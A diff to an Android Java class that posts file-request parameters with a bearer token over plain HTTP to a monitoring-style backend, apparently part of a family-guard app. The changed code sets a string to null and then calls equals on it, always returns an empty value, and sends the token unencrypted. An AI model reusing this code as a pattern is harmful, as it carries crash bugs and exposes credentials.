@@ -2,13 +2,16 @@ package com.inet.android.request;
 
 import org.apache.http.Header;
 import org.apache.http.message.BasicHeader;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
 
 import com.inet.android.utils.Logging;
-import com.loopj.android.http.AsyncHttpResponseHandler;
+import com.loopj.android.http.JsonHttpResponseHandler;
 import com.loopj.android.http.RequestParams;
 import com.loopj.android.http.SyncHttpClient;
 
@@ -16,10 +19,10 @@ public class FileCaller {
 	private final static String LOG_TAG = FileCaller.class.getSimpleName()
 			.toString();
 	static int response = -1;
+	static String data = "";
 
-	public static void sendRequest(final RequestParams params,
+	public static String sendRequest(final RequestParams params,
 			final Context mContext) {
-
 		SyncHttpClient client = new SyncHttpClient();
 		String URL = "http://family-guard.ru/api/informative";
 		SharedPreferences sp = PreferenceManager
@@ -30,33 +33,44 @@ public class FileCaller {
 				new BasicHeader("Authorization", "Bearer " + token) };
 		Logging.doLog(LOG_TAG, "params: " + params.toString(), "params: "
 				+ params.toString());
-	
 
 		client.post(mContext, URL, headers, params, null,
-				new AsyncHttpResponseHandler() {
+				new JsonHttpResponseHandler() {
 					@Override
 					public void onStart() {
 						// called before request is started
 						Logging.doLog(LOG_TAG, "onStart. StartCode",
 								"onStart. StartCode");
-
-					}
+		}
 
 					@Override
-					public void onSuccess(int arg0, Header[] arg1, byte[] arg2) {
+					public void onSuccess(int arg0, Header[] arg1,
+							JSONObject timeline) {
 						Logging.doLog(LOG_TAG, "onSuccess. StatusCode: " + arg0
-								+ arg1 + arg2, "onSuccess. StatusCode");
+								+ " " + timeline, "onSuccess. StatusCode"
+								+ arg0 + " " + timeline);
+						String str = "";
+						try {
+							str = timeline.getString("code");
+						} catch (JSONException e) {
+							str = null;
+						}
+						if (str.equals("2")) {
+							RequestList.sendPeriodicRequest(mContext);
+						}
 					}
 
 					@Override
-					public void onFailure(int arg0, Header[] arg1, byte[] arg2,
-							Throwable arg3) {
-						Logging.doLog(LOG_TAG, "onFailru. StatusCode" + arg0
-								+ " " + arg3, "onFailru. StatusCode" + arg0
-								+ " " + arg3);
-						ParseToError.setError(arg0, params,
+					public void onFailure(int statusCode, Header[] headers,
+							Throwable throwable, JSONArray errorResponse) {
+						Logging.doLog(LOG_TAG, "onFailru. StatusCode"
+								+ statusCode + " " + errorResponse,
+								"onFailru. StatusCode" + statusCode + " "
+										+ errorResponse);
+						ParsingErrors.setError(statusCode, params,
 								ConstantValue.TYPE_FILE_REQUEST, mContext);
 					}
 				});
+		return data;
 	}
 }
